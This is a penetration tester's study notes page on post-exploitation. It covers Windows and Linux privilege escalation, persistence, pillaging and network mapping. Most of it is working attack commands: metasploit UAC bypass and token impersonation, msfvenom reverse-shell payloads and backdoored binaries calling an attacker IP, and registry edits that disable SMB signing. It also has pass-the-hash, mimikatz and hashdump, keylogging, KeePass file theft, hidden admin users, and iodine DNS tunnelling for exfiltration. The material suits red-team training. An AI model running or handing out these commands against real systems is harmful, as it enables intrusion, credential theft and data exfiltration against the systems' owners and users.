> The last step in the penetration testing chain (info gathering -> scanning -> enumeration -> sniffing -> va & exploitation -> post exploitation)

Post exploitation is a cyclic process requiring the application of the same steps if new targets are found in the network

Post exploitation methodology:
1. Privilege escalation + maintaining access
2. Pillaging: Harvesting of data
3. Scanning of the internal network
4. Exploitation of new systems and pivoting
5. Goto 1 (if new machine is found and exploited)

## Enumeration of exploits

- [PEASS](https://github.com/carlospolop/PEASS-ng)

## Privilege escalation

> Extending the rights on a target already exploited from a normal user to either `root` or `NT AUTHORITY\SYSTEM`  (former linux, latter windows)

### General

- check permissions and replace `dlls` and `executables` with your epxploitcode where possible
- inject code into executables [shellter](https://www.shellterproject.com/introducing-shellter/) or [backdoorfactory](https://github.com/secretsquirrel/the-backdoor-factory) `msfvenom` also does the job-> requires restart of application!

### Windows privilege escalation

Comprised of several steps, in the assumption we use metasploit and have a meterpreter session

1. Maintain access through process migration (same permissions, added stability)

```bash
meterpreter> run post/windows/manage/migrate
```

2. Maintain access with higher permissions

```bash
meterpreter> getsystem  # may no longer work on modern OSes (UAC and AV blocking)

# verify if UAC is activated
msf> use post/windows/gather/win_privs

# if UAC is on and we have no permissions, check for bypass
msf> search bypassuac
msf> use exploit/windows/local/bypassuac_windows_store_filesys  # or other

# verify privilege escalation
msf> use post/windows/gather/win_privs
meterpreter> getsystem  # if we have admin, this should be successfull
```

3. Change the user through tokens and impersonation

With using the `incognito`  module in metasploit

```bash
meterpreter> use incognito
meterpreter> getuid
meterpreter> list_tokens -u
```

After checking what delegation tokens are available, we can impersonate other accounts (without cracking passwords!)

```bash
meterpreter> impersonate_token <domain\\user>  # user from bevore evaluated accs
meterpreter> getuid  # verify
```

#### unqouted service paths

> Abuse search order of the windows system (search current dir before system paths) and the fact that if there are paths with a space, first matching exe wins! [icacl permissions](https://theitbros.com/using-icacls-to-list-folder-permissions-and-manage-files/)

```powershell
c:\this\is a\bad path\example.exe # unqoted has spaces
"c:\this is better\than above\example.exe" # quoted

icacls c:\  # check if you can write!
icacls c:\this
```

If write permissions are available, we can place our payload in certain fractions of the unqouted path - because search order would access it like this:

1. `c:\this\is.exe`
2. `c:\this\is a\bad.exe`
3. `c:\this\is a\bad path\example.exe`

> Exploit via dropping an `is.exe` under `c:\this\` or a `bad.exe` on path 2

```powershell
# display unqouted service paths with wmic
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

Or check the service manually by name

```powershell
sc qc <nameOfService>
```

Using metasploit:

```bash
msf> use exploit/windows/local/unqouted_service_path
```

Or manually replace an exe on that path with your payload an *trigger execution*. Try if you have permissions by:

```powershell
sc qc <serviceInQuestion> # displays as who the service is run and if autostart is set
sc stop <serviceInQuestion>
sc start <serviceInQuestion>
```

**IMPORTANT:** We have to be able to start and stop the service to be able to exploit this vulnerability. Also if the service is on autostart and we can provoke a crash + restart or just reboot the machine in order to trigger execution.

#### UAC bypass

> Tools for bypassing the user account control of windows

- [uacme](https://github.com/hfiref0x/UACME) (has to be compiled with VStudio 2015 or later)

```bash
meterpreter> shell
shell> akagi.exe 58 c:\users\downloads\exploit.exe  # 58 for the method, and the latter the payload that shall be executed
```

### Linux privilege escalation

Some differences to windows, exploitcode may have to be compiled for the target plattform  `x86`, `x86_64`, `arm` and so on...

#### Exploit c Code

Preferably, if there is a compiler on the remote system use that one (okay it may not be silent, but the architecture will be correct!)

```bash
# on remote system with meterpreter
meterpreter> upload /local/path/to/code.c
meterpreter> gcc code.c -o exploit

# local system
apt install gcc-multilib  # allows compiling for other archs
gcc -m32 code.c -o exploit  # compiled for 32-bit
```


## Maintaining access

> To avoid loosing your session and maintain access (as the user can otherwise kill the process) -> **persistence**

Via
- password hashes (windows: pth, or cracking them)
- backdoors
- new user

### Password hash

Simply dump the hashes with meterpreter (requires permissions) -> if it fails migrate into another `NT AUTHORITY\SYSTEM` owned process and try again!

```bash
meterpreter> hashdump  # requires privileges

# for windows specially
meterpreter> run post/windows/gather/smart_hashdump
meterpreter> background
msf> creds
msf> loot
```

The next steps mainly concern windows operating systems

1. Acquire persistence through obtained hashes with `smbexec` 

```bash
msf> use exploit/windows/smb/psexec  # as smbpass use the preiously gained hashes
```

**OnError:** `STATUS_ACCESS_DENIED (Command=117 WordCount=0)` change registry for persistence  

```powershell
Set-ItemProperty -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord

Set-ItemProperty -Path HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters -Name RequireSecuritySignature -Value 0 -Type DWord
```

Or `cmd` `reg` command:

```powershell
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f  

reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f
```

Registry value `LocalAccountTokenFilterPolicy` allows users in the local admin group to sometimes *pass-the-hash*

2. Use `xfreerdp` for `pth`

```bash
xfreerdp /u:admin /d:domainCorp /pth:<theHashToPass> /v:<IPofTarget>
```

3. Obviously: crack the hashes - if you got the time

- requires x64 process for best performance and functionality 

```bash
meterpreter> ps -A x86_64 -s # possible if NT-System
meterpreter> migrate <PID>
meterpreter> load mimikatz
meterpreter> wdigest # old 
```

4. Windows Credentials Editor [companyWebpage](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### Enable services for persistence

> In order to gain persistence, we may have to enable services so we can connect again (mainly windows)

Show running services on the host

```powershell
net start
wmic service where 'Caption like "<ServiceName>%" and started=true' get Caption
```

```bash
meterpreter> run service_manager -l
meterpreter> run post/windows/gather/enum_services
```

If RDP is disabled, we can enable it with metasploit

```bash
meterpreter> run post/windows/manage/enable_rdp
```

To *add* a new RDP user, do the following

```powershell
net user <username> <password> /add  # create new user
net localgroup "Remote Desktop Users" <username> /add  # add new user to RDP grp
```

### Backdoor with metasploit

> Requires a public IP/DNS-Name for better use (this backdoor is connect back from victim to attacker)

```bash
meterpreter> run persistence -A -X -i 5 -p <attkListeningPort> -r <attkIP>
```

What happens?
1. Creating payload
	- `msfvenom` or `Veil` or `BDF`
2. Uploading file
	- upload: `upload ./backdoor.exe c:\\path\\on\\target`
3. Executing backdoor
4. Adding entry to registry
	- `reg setval -k HKML\\software\\windows\\currentversion\\run -d "c:\path\on\target\backdoor.exe" -v backdoor_name_key`

Check on victim:

```bash
meterpreter> reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v <tempName> # see script output for the temp name
meterpreter> ls c:\\windows\\TEMP\\<tempFileName> # check if vbs has been written
```

-> Start handler in metasploit to accept connection

#### Create payload manually with msfvenom

> Implanting a "backdoor" into a programm with msfvenom and a reverse connect shell. This allows us to replace a service binary with a still functioning one that ALSO triggers a backconnect to the attacker machine.

```bash
msfvenom -a x86 --platform windows -x program2modify.exe -k -p windows/meterpreter/reverse_tcp lhost=<attackerIP> lport=<attackerPort> -e x86/shikata_ga_nai -i 15 -b "\x00" -f exe -o outputFile.exe
```

-> This option is helpful when replacing a windows binary with set autorecovery option, if we simply replace the service exe with only our payload the interface to windows service is missing and the operating system tries to restart the servicebinary as it is non-responsive to the default communication interface of windows services!

#### Other metasploit option

```bash
meterpreter> use exploit/windows/local/persistence
meterpreter> set startup system # switch to system privileges
meterpreter> set payload windows/meterpreter/reverse_tcp
```

```bash
meterpreter> use exploit/windows/local/persistence_service
meterpreter> set session 1
meterpreter> set lport 6543
meterpreter> exploit
# start your handler on 6543 and on reboot a new session should connect back
```

### Adding new users

> Add new users with a password only we know and that isn't changed by other people

```powershell
net user <username> <password> /add # adds new LOCAL user on the machine
net localgroup "<groupname>" <username> /add
``` 

Add the user also to `RDP` or `telnet` or `ssh` groups!

### DLL hijacking

> Abuse the loadorder of libraries and replace them with malicious files, for further information or mitigation check `dll` loadorder [here](https://support.microsoft.com/en-us/topic/secure-loading-of-libraries-to-prevent-dll-preloading-attacks-d41303ec-0748-9211-f317-2edc819682e1)
> New [source](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)

To find programs with this vulnerability we can use `processmonitor` of the `sysinternals` suite:

Filter for a specific serviceBinary to check for:
- `Process Name | is | <serviceBinary> | Include`
- `Result | is | NAME NOT FOUND | Include`

Check the results for paths where write permissions are given and drop your DLL with the *SAME NAME* as in the 'NAME NOT FOUND' result there

#### Creating a dll

With `msfvenom` use the `-f dll` option to create a dll  

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<myIP> LPORT=<myPort> -f dll > payload64.dll
```


## Pillaging

> Or harvesting all interesting data you may find

1. Getting general system information

```powershell
systeminfo  # Windows specific
```

```bash
meterpreter> sysinfo  # general for linux/windows
meterpreter> run post/windows/gather/*  # take the scripts as you need them
```

2. Check what services are running

```powershell
wmic service get Caption,StartName,State,pathname  # wmic - if installed
net start  # net - always available
```

```bash
service --status-all  # linux display of running services
```

3. Check if the machine is part of a domain (windows)

```powershell
net view /domain  # error if not part of domain
net group "Domain Controllers" /Domain  # error if not part of domain
```

4. Check the existing user accounts

```powershell
net user  # only local accounts!
net user /domain  # displays domain users, if part of domain
```

```bash
cat /etc/passwd
```

5. Check groups

```powershell
net localgroup  # local groups
net localgroup Administrators  # shows members of the Admin group
```

```bash
cat /etc/group
```

6. Check for fileshares

```powershell
net share
```

7. Check network information

```bash
meterpreter> ifconfig
meterpreter> run winenum  # for windowos

# otherwise
ip a  # for linux
ipconfig /all  # for windows
```

8. Windows specific, discover other hostname within domain

```powershell
net view  # displays other hosts if network discovery is enabled
```

### docs, logs, files and keystrokes

> Files, logs, docs and keyboard interaction may reveal useraccounts, passwords and other information of the internal network

#### Keystrokes

Keystrokes are collected, depending on the user and application context (if used with metasploit `keyscan_start` and `keylogrecorder`)  

```bash
meterpreter> migrate <pidExplorer.exe>
meterpreter> keyscan_start
meterpreter> keyscan_dump # shows catched keystrokes
```

- `keylogrecorder` script migrates autonatically to `explorer.exe` and saves strokes to file

```bash
meterpreter> run keylogrecorder -c 0 # c 0 -> use key presses
```

#### Files

> Check configs, logs, and login information of installed software (FTP, browser, messenger apps...)

- Search for keypass files

```bash
meterpreter> search -d C:\\Users\\<username>\\ -f *.kdbx
meterpreter> download bla.kdbx
```

- Search for credentials

```bash
meterpreter> run post/windows/gather/credentials/* # check which script matches your case
meterpreter> run post/windows/gather/enum_chrome # check other possible gathering targets
meterpreter> run post/multi/gather/* # other gather scripts
```

### Data exfiltration

> This method may bypass firewalls and other restricting mechanisms

Via `DNS` tunneling we can establish connections using the `DNS` protocol, which is usually not as restricted as the rest

Requirements:
- Controlled over the web reachable domain (name arbitrary or tailored for the target)
- Server listening on the domain name used
- DNS control in that domain
- Tool for DNS tunneling, like [iodine](https://github.com/yarrick/iodine)

1. Check if DNS is blocked

```bash
ping www.yourdomain.com
# if resolved to ip but icmp not packets lost, may imply DNS works but ICMP blocked
```

2. Start iodine on online server in the web

```bash
# server
iodine -u <user> -P '<password>' -f 10.0.0.1 <ns.of.controlled.domain.com> # -f marking endpoint ip of tunnel
```

3. Start iodine client on the internal network

```bash
iodine -P '<password>' <ns.of.controlled.domain.com> -T CNAME -r -f
```

-> If successfull `DNS` tunnel established (check interfaces with `ip a`, new tunnel interface should exist)

Create an ssh tunnel inside the `DNS` tunnel for a socks proxy.

```bash
ssh user@<remoteIP> -D<dns01IP>:1234 -N -C # ssh tunnel to the remote endpoint through our local dns01 interface that represents the dns tunnel
```

Internet now accessible over the ssh socks proxy inside the dns tunnel

**ALWAYS pipe the traffic over an ssh tunnel to avoid MITM scenarios where the data is captured and decoded!**

## Mapping the internal network

- Check connected networks see [[Network Security/Post Exploitation#Pillaging]]
- Check reachable networks via routes in the system

```bash
meterpreter> route -v
shell> ip route  # linux
cmd> route print  # windows
```

- Check `ARP` cache for other machines in the subnet

```bash
shell> cat /proc/net/arp  # linux
cmd> arp -a  # windows
```

- Display open connections from or to the machine

```bash
shell> netstat -tulpn | grep LISTEN
cmd> netstat -ano | find "LISTENING"
```

- Check `DNS` cache for domain names and IPs

```bash
shell> sudo journalctl -u systemd-resolved  # -u check for unit systemd-resolved
cmd> ipconfig /displaydns
```

- With meterpreter

```bash
meterpreter> run arp_scanner -r 10.11.12.0
meterpreter> run netenum -h

msf> use post/multi/gather/ping_sweep  # verify result above with this
msf> set RHOSTS <otherSubnet>/24
```

## Exploitation of new systems and pivoting

- Exploitation of new systems can be found here: [[Exploitation]]
- How to pivot and what tools to use is explained here: [[Pivoting]]
